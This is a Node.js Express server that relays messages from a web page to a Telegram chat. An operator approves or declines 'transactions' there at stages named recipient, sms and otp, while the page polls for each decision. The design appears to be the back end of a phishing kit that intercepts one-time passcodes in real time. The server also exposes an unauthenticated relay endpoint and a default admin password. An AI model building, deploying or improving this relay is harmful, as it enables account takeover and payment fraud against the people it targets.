const express = require('express');
const path = require('path');
const app = express();

app.use(express.json({ limit: '1mb' }));
app.use(express.static(__dirname));

// ============================================================
// NO-CACHE HEADERS (so admin edits show up immediately)
// ============================================================
app.use((req, res, next) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

const BOT_TOKEN = () => process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = () => process.env.TELEGRAM_CHAT_ID;
const ADMIN_USER = () => process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = () => process.env.ADMIN_PASS || 'changeme123';

// ============================================================
// TRANSACTION STORE
// ============================================================
const transactions = new Map();

setInterval(() => {
  const cutoff = Date.now() - 60 * 60 * 1000;
  for (const [id, txn] of transactions.entries()) {
    if (txn.updatedAt < cutoff) transactions.delete(id);
  }
}, 5 * 60 * 1000);

// ============================================================
// TELEGRAM HELPERS
// ============================================================
async function sendTelegram(text, replyMarkup = null) {
  if (!BOT_TOKEN() || !CHAT_ID()) {
    console.warn('⚠️ Telegram not configured — logging only');
    console.log(text);
    return { ok: false, error: 'Telegram not configured' };
  }
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN()}/sendMessage`;
    const body = {
      chat_id: CHAT_ID(),
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      ...(replyMarkup ? { reply_markup: replyMarkup } : {})
    };
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await res.json();
    if (!data.ok) console.error('Telegram API error:', data);
    return data;
  } catch (err) {
    console.error('Telegram send error:', err.message);
    return { ok: false, error: err.message };
  }
}

async function editTelegramMessage(chatId, messageId, text, replyMarkup = null) {
  if (!BOT_TOKEN()) return;
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN()}/editMessageText`;
    const body = {
      chat_id: chatId,
      message_id: messageId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      ...(replyMarkup ? { reply_markup: replyMarkup } : {})
    };
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    return res.json();
  } catch (err) {
    console.error('Edit message error:', err.message);
  }
}

async function answerCallback(callbackQueryId, text = '') {
  if (!BOT_TOKEN()) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN()}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text })
    });
  } catch (err) {
    console.error('Answer callback error:', err.message);
  }
}

// ============================================================
// BUILD INLINE KEYBOARD WITH APPROVE / DECLINE BUTTONS
// ============================================================
function buildApprovalKeyboard(txnId) {
  return {
    inline_keyboard: [
      [
        { text: '✅ Approve', callback_data: `approve:${txnId}` },
        { text: '❌ Decline', callback_data: `decline:${txnId}` }
      ],
      [
        { text: '📋 Status', callback_data: `status:${txnId}` }
      ]
    ]
  };
}

// ============================================================
// API: ADMIN LOGIN
// ============================================================
app.post('/api/admin/login', (req, res) => {
  try {
    const { username, password } = req.body || {};

    if (!username || !password) {
      return res.status(400).json({ ok: false, error: 'Username and password are required.' });
    }

    const userMatch = String(username) === String(ADMIN_USER());
    const passMatch = String(password) === String(ADMIN_PASS());

    if (userMatch && passMatch) {
      return res.json({ ok: true });
    }

    return res.status(401).json({ ok: false, error: 'Invalid username or password.' });
  } catch (err) {
    console.error('Admin login error:', err);
    res.status(500).json({ ok: false, error: 'Server error. Please try again.' });
  }
});

// ============================================================
// API: SEND MESSAGE + REGISTER TRANSACTION (with buttons)
// ============================================================
app.post('/api/telegram', async (req, res) => {
  try {
    const { message, txnId, stage, withButtons } = req.body;

    if (!message) {
      return res.status(400).json({ ok: false, error: 'No message' });
    }

    if (txnId) {
      const existing = transactions.get(txnId) || {
        createdAt: Date.now(),
        history: []
      };
      existing.status = 'pending';
      existing.stage = stage || existing.stage || 'unknown';
      existing.updatedAt = Date.now();
      existing.history.push({
        stage: existing.stage,
        status: 'pending',
        at: Date.now()
      });
      transactions.set(txnId, existing);
    }

    const needsButtons = withButtons !== false && txnId && (
      stage === 'recipient' ||
      stage === 'sms' ||
      stage === 'otp-verify' ||
      stage === 'otp'
    );

    const keyboard = needsButtons ? buildApprovalKeyboard(txnId) : null;

    const data = await sendTelegram(message, keyboard);
    res.json({ ok: true, telegram: data });
  } catch (err) {
    console.error('Send error:', err);
    res.status(500).json({ ok: false, error: err.message });
  }
});

// ============================================================
// API: STATUS
// ============================================================
app.get('/api/status/:txnId', (req, res) => {
  const txn = transactions.get(req.params.txnId);
  if (!txn) return res.json({ status: 'unknown', stage: null });
  res.json({
    status: txn.status,
    stage: txn.stage,
    updatedAt: txn.updatedAt
  });
});

// ============================================================
// API: RESET
// ============================================================
app.post('/api/reset/:txnId', (req, res) => {
  const txn = transactions.get(req.params.txnId);
  if (txn) {
    txn.status = 'pending';
    txn.updatedAt = Date.now();
    txn.history.push({ stage: txn.stage, status: 'reset', at: Date.now() });
    transactions.set(req.params.txnId, txn);
  }
  res.json({ ok: true });
});

// ============================================================
// TELEGRAM POLLER — handles button taps + text commands
// ============================================================
let lastUpdateId = 0;

async function pollTelegram() {
  if (!BOT_TOKEN()) {
    setTimeout(pollTelegram, 10000);
    return;
  }

  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN()}/getUpdates?timeout=20&offset=${lastUpdateId + 1}`;
    const res = await fetch(url);
    const data = await res.json();

    if (data.ok && Array.isArray(data.result)) {
      for (const update of data.result) {
        lastUpdateId = update.update_id;

        // --- Handle button taps (callback_query) ---
        if (update.callback_query) {
          const cq = update.callback_query;
          const dataStr = cq.data || '';
          const [action, txnId] = dataStr.split(':');

          if (String(cq.from.id) !== String(CHAT_ID()) && String(cq.message?.chat?.id) !== String(CHAT_ID())) {
            await answerCallback(cq.id, 'Unauthorized');
            continue;
          }

          const txn = transactions.get(txnId);
          if (!txn) {
            await answerCallback(cq.id, '⚠️ Unknown transaction');
            continue;
          }

          if (action === 'approve') {
            txn.status = 'approved';
            txn.updatedAt = Date.now();
            txn.history.push({ stage: txn.stage, status: 'approved', at: Date.now() });
            transactions.set(txnId, txn);

            await answerCallback(cq.id, '✅ Approved');

            const originalText = cq.message?.text || '';
            const updatedText = originalText + `\n\n✅ <b>APPROVED</b> at ${new Date().toLocaleTimeString('en-GB')}`;
            await editTelegramMessage(
              cq.message.chat.id,
              cq.message.message_id,
              updatedText,
              null
            );
          } else if (action === 'decline') {
            txn.status = 'declined';
            txn.updatedAt = Date.now();
            txn.history.push({ stage: txn.stage, status: 'declined', at: Date.now() });
            transactions.set(txnId, txn);

            await answerCallback(cq.id, '❌ Declined');

            const originalText = cq.message?.text || '';
            const updatedText = originalText + `\n\n❌ <b>DECLINED</b> at ${new Date().toLocaleTimeString('en-GB')}`;
            await editTelegramMessage(
              cq.message.chat.id,
              cq.message.message_id,
              updatedText,
              null
            );
          } else if (action === 'status') {
            await answerCallback(cq.id, `Status: ${txn.status} • Stage: ${txn.stage}`);
          }
          continue;
        }

        // --- Handle text commands (fallback) ---
        const msg = update.message || update.edited_message;
        if (!msg || !msg.text) continue;
        if (String(msg.chat.id) !== String(CHAT_ID())) continue;

        const text = msg.text.trim();
        const approveMatch = text.match(/^\/approve(?:@\w+)?\s+(\S+)/i);
        const declineMatch = text.match(/^\/decline(?:@\w+)?\s+(\S+)/i);

        if (approveMatch) {
          const txn = transactions.get(approveMatch[1]);
          if (txn) {
            txn.status = 'approved';
            txn.updatedAt = Date.now();
            txn.history.push({ stage: txn.stage, status: 'approved', at: Date.now() });
            transactions.set(approveMatch[1], txn);
            await sendTelegram(`✅ <b>APPROVED</b>\n<code>${approveMatch[1]}</code>`);
          }
        } else if (declineMatch) {
          const txn = transactions.get(declineMatch[1]);
          if (txn) {
            txn.status = 'declined';
            txn.updatedAt = Date.now();
            txn.history.push({ stage: txn.stage, status: 'declined', at: Date.now() });
            transactions.set(declineMatch[1], txn);
            await sendTelegram(`❌ <b>DECLINED</b>\n<code>${declineMatch[1]}</code>`);
          }
        } else if (/^\/status(?:@\w+)?$/i.test(text)) {
          const lines = ['📋 <b>Recent transactions</b>', '━━━━━━━━━━━━━━━━━━━━'];
          const sorted = [...transactions.entries()]
            .sort((a, b) => b[1].updatedAt - a[1].updatedAt)
            .slice(0, 10);
          if (sorted.length === 0) lines.push('No transactions yet.');
          for (const [id, txn] of sorted) {
            const emoji = txn.status === 'approved' ? '✅' : txn.status === 'declined' ? '❌' : '⏳';
            lines.push(`${emoji} <code>${id}</code> — ${txn.stage} (${txn.status})`);
          }
          await sendTelegram(lines.join('\n'));
        } else if (/^\/help(?:@\w+)?$/i.test(text)) {
          await sendTelegram(`🤖 <b>Bot commands</b>

Tap the ✅ Approve / ❌ Decline buttons on any transaction message.

Or use text commands:
<b>/approve</b> <code>&lt;txnId&gt;</code>
<b>/decline</b> <code>&lt;txnId&gt;</code>
<b>/status</b> — list recent transactions
<b>/help</b> — show this message`);
        }
      }
    }
  } catch (err) {
    console.error('Poll error:', err.message);
  }

  setTimeout(pollTelegram, 1500);
}

// ============================================================
// HEALTH
// ============================================================
app.get('/health', (req, res) => {
  res.json({
    ok: true,
    telegramConfigured: !!(BOT_TOKEN() && CHAT_ID()),
    adminConfigured: !!(ADMIN_USER() && ADMIN_PASS()),
    activeTransactions: transactions.size,
    uptime: Math.floor(process.uptime())
  });
});

// ============================================================
// SERVE INDEX.HTML FOR ALL OTHER ROUTES
// ============================================================
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`   Telegram configured: ${!!(BOT_TOKEN() && CHAT_ID())}`);
  console.log(`   Admin configured:    ${!!(ADMIN_USER() && ADMIN_PASS())}`);
  console.log(`   Starting Telegram poller...`);
  setTimeout(pollTelegram, 2000);
});
